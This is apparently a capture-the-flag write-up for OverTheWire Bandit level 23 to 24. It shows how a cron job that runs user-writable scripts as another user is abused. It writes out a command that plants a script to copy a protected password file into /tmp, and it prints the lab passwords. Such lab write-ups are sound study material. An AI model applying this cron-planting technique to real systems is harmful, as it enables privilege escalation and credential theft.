
## Bandit Level 23 → Level 24


### 🎯 Objective  

- Log in as `bandit23`  
- Analyze the cron job  
- Inject a script into the execution directory  
- Retrieve the password for the next level  


---

### 🧭 Quick Action Summary  

- Login as `bandit23`  
- Inspect the cron job and script  
- Place a custom script in the cron directory  
- Wait for execution  
- Read the password file  


---

### 🔑 Credentials Provided  

- **Username:** bandit23  
- **Password:** oZf11IOIjMVN55iJX3CmStKLYqjk54Ga  


---

### 🔍 Method of Solve  

A cron job runs every minute as `bandit24` and executes all files placed inside `/var/spool/bandit24/foo`.  
By placing a custom script in this directory, commands can be executed with `bandit24` privileges.

Steps followed:  
- Inspect the cron configuration  
- Create a script to copy the password  
- Place the script in the cron execution directory  
- Read the output file  


---

### 🧪 Commands Used  

- `cd /etc/cron.d`  
- `ls`  
- `cat cronjob_bandit24`  
- `cat /usr/bin/cronjob_bandit24.sh`  
- `echo 'cat /etc/bandit_pass/bandit24 > /tmp/...ak.txt; chmod 777 /tmp/...ak.txt' > /var/spool/bandit24/foo/ak.sh`  
- `chmod +x /var/spool/bandit24/foo/ak.sh`  
- `cat /tmp/...ak.txt`  


---

### 🧩 Command Purpose  

| Command | Purpose |
|--------|--------|
| `cronjob_bandit24.sh` | Script executed by the cron job |
| `echo > ak.sh` | Creates a malicious script |
| `chmod +x` | Makes the script executable |
| `cat /tmp/...ak.txt` | Reads the stolen password |


---

### 📸 Screenshot Evidence  

**Step 1 – Cronjob Configuration & Script**  
![Bandit Level 23 – Cronjob](screenshots/level23_1.png)

**Step 2 – Payload Execution & Password Retrieval**  
![Bandit Level 23 – Password](screenshots/level23_2.png)


---

### 🔑 Next Level Password  

```
gb8KRRcsshuzXi0tUuR6ypOFjiZbf3G8
```


---

### 🧠 Explanation  

- The cron job runs all scripts in `/var/spool/bandit24/foo`  
- A custom script is placed in this directory  
- The script copies the password to a readable location  
- The password is retrieved from the output file  


---

### 🔐 Concept Learned  

This level demonstrates how insecure cron jobs can be abused for privilege escalation.  
It highlights the risks of executing user-controlled files in scheduled tasks.


---

### 🛡️ Security Insight  

Cron jobs must never execute files from writable directories.  
Failing to restrict access can allow attackers to gain elevated privileges.
